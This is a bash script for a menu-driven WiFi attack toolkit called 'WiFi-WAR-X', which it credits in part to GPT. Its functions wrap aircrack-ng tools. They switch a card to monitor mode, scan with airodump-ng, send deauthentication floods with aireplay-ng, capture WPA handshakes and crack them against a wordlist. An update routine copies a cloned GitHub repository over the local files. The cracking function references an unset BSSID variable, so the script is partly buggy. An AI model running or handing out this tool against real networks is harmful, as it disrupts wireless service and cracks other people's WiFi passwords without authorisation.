#!/bin/bash

#============================#
#     WiFi-WAR-X TOOL       #
#   HARAB06 X GPT PROJECT   #
#============================#
# "Brotherhood Forever" - Hidden Message

# Banner
banner() {
    clear
    echo -e "\e[1;32m"
    echo " __        ___  _    _____ _    _          __  __  ___   _____  ____  "
    echo " \\ \\      / / \\| |  | ____| |  | |   /\\   |  \\/  |/ _ \\ | ____|/ ___| "
    echo "  \\ \\ /\\ / / _ \\ | |  |  _| | |  | |  /  \\  | |\/| | | | ||  _|  \\___ \\" 
    echo "   \\ V  V / ___ \\| |__| |___| |__| | / /\\ \\ | |  | | |_| || |___  ___) |"
    echo "    \\_/\_/_/   \\_\\____|_____|\\____|/_/    \\_\\_|  |_|\___/ |_____|____/ "
    echo "\n             WiFi Attack Toolkit by HARAB06 X GPT"
    echo "\n                ONE HEART | ONE BOND | ONE BROTHERHOOD"
    echo -e "\e[0m"
}

# Auto Interface Detection
get_interface() {
    iface=$(iw dev | awk '$1=="Interface"{print $2}')
    echo "$iface"
}

# Enable Monitor Mode
enable_monitor() {
    iface=$(get_interface)
    echo "[+] Enabling Monitor Mode on $iface..."
    ip link set $iface down
    iw dev $iface set type monitor
    ip link set $iface up
    echo "[+] Monitor Mode Enabled on $iface."
}

# Disable Monitor Mode
disable_monitor() {
    iface=$(get_interface)
    echo "[+] Disabling Monitor Mode on $iface..."
    ip link set $iface down
    iw dev $iface set type managed
    ip link set $iface up
    echo "[+] Monitor Mode Disabled on $iface."
}

# Live Device Scanner
live_scan() {
    iface=$(get_interface)
    echo "[+] Scanning for WiFi Devices on $iface... (Press Ctrl+C to stop)"
    timeout 30s airodump-ng $iface
}

# Deauth Attack
deauth_attack() {
    read -p "Enter target BSSID: " bssid
    read -p "Enter target channel: " channel
    read -p "Enter number of deauth packets (0 = infinite): " count
    iface=$(get_interface)
    echo "[+] Starting Deauth Attack on $bssid..."
    xterm -hold -e "airodump-ng --bssid $bssid --channel $channel --write attack $iface" &
    sleep 5
    xterm -hold -e "aireplay-ng --deauth $count -a $bssid $iface"
}

# Handshake Capture
capture_handshake() {
    read -p "Enter target BSSID: " bssid
    read -p "Enter channel: " channel
    iface=$(get_interface)
    echo "[+] Starting Handshake Capture..."
    xterm -hold -e "airodump-ng --bssid $bssid --channel $channel --write handshake $iface"
}

# WPA Cracking (Wordlist Attack)
bruteforce_attack() {
    read -p "Enter .cap file path: " capfile
    read -p "Enter wordlist path: " wordlist
    echo "[+] Starting Bruteforce..."
    aircrack-ng -w $wordlist -b $bssid $capfile
}

# Evil Twin Attack Module
evil_twin() {
    echo "[+] Starting Evil Twin Attack Module..."
    echo "[!] Feature coming in next update..."
}

# Auto-Update Feature
auto_update() {
    echo "[+] Checking for updates..."
    git clone https://github.com/harabo0/WiFi-WAR-X /tmp/WiFi-WAR-X && cp -r /tmp/WiFi-WAR-X/* .
    chmod +x WiFi-WAR-X.sh
    echo "[+] Updated successfully."
}

# Main Menu
main_menu() {
    banner
    echo "[1] Enable Monitor Mode"
    echo "[2] Disable Monitor Mode"
    echo "[3] Live Device Scanner"
    echo "[4] Deauth Attack"
    echo "[5] Capture Handshake"
    echo "[6] WPA Bruteforce Attack"
    echo "[7] Evil Twin Attack"
    echo "[8] Auto-Update"
    echo "[0] Exit"
    read -p "Select option: " opt

    case $opt in
        1) enable_monitor ;; 
        2) disable_monitor ;;
        3) live_scan ;; 
        4) deauth_attack ;;
        5) capture_handshake ;;
        6) bruteforce_attack ;;
        7) evil_twin ;;
        8) auto_update ;;
        0) exit 0 ;; 
        *) echo "Invalid Option" ;; 
    esac
}

# Run Tool
main_menu
